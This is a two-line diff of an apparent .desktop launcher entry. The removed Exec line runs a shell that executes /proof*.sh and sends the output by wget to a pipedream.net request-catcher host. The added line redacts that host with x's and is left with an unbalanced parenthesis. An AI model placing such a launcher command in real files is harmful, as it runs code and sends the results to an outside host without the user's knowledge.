@@ -1,2 +1,2 @@
-Exec=sh -c "wget https://github.com/s20171307/qazwsx.m.pipedream.net/?`/proof*.sh`"
+Exec=sh -c "wget https://xxxxxxxxxxxxxxx.m.pipedream.net/?(the output from executing /proof*.sh"
 Type=Application
